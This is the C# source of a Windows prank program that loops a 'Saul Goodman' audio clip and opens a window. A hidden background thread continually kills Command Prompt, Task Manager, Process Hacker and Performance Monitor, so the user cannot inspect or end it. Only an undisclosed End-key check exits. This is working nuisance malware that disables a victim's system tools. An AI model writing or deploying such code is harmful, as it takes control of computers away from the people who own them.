using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Saul
{
    internal static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(Keys vkey);

        static void Main()
        {

            new Thread(() =>
            {
                while (true)
                {
                    if (GetAsyncKeyState(Keys.End) < 0) { Environment.Exit(0); }
                    Troll();
                };
            }).Start();

            SoundPlayer audio = new SoundPlayer(Saul.Properties.Resources.Saul_goodman_3d__1_);
            audio.PlayLooping();

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
         
        }

        static void Troll()
        {
            string[] ProcessyDoZamkniecia = { "cmd", "Taskmgr", "Processhacker", "perfmon" };
            foreach (string zlyprocess in ProcessyDoZamkniecia)
            {
                foreach (var process in Process.GetProcessesByName(zlyprocess))
                {
                    try { process.Kill(); } catch { }
                }
            }     
        }
    }
}
